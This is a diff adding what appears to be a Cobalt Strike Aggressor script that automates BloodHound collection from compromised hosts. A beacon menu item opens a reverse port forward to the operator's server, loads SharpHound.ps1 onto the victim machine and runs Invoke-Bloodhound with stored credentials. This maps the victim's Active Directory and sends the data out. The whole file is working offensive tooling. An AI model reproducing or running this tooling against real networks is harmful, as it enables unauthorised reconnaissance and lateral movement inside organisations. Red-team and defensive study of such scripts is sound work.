@@ -1,0 +1,47 @@
+import main.ServerPrompt from: "bloodhound/BloodhoundGUI.jar";
+import main.ParametersPrompt from: "bloodhound/BloodhoundGUI.jar";
+import main.ErrorPrompt from: "bloodhound/BloodhoundGUI.jar";
+
+debug(5);
+
+menubar("&Bloodhound", "cBloodhound");
+
+popup cBloodhound {	
+	item "Server"  { configureServer(); }
+	item "Parameters"  { configureParameters(); }
+};
+
+popup beacon_bottom {
+	
+	item "Gather Bloodhound" {
+	
+		local('$handle $uri $port $un $pass');
+		if(-exists "bloodhound/bhparam.conf" && -exists "bloodhound/bhserver.conf"){
+			$handle = openf("bloodhound/bhserver.conf");
+			$uri = readln($handle);
+			$port = readln($handle);
+			$un = readln($handle);
+			$pass = readln($handle);
+			$rport = readln($handle);
+			closef($handle);
+			
+			$handle = openf("bloodhound/bhparam.conf");
+			$param = readln($handle);
+			$param = "Invoke-Bloodhound -NoSaveCache " . $param . " -URI " . "http://localhost:" . $rport . " -UserPass " . $un . ":" . $pass; 
+			
+			brportfwd($1, $rport, $uri, $port);
+			bpowershell_import($1, "bloodhound/SharpHound.ps1");
+			bpowershell($1,$param); 
+		} else {
+			[ErrorPrompt prompt];
+		}
+	}
+};
+
+sub configureServer {
+	[ServerPrompt prompt];
+};
+
+sub configureParameters {
+	[ParametersPrompt prompt];
+};
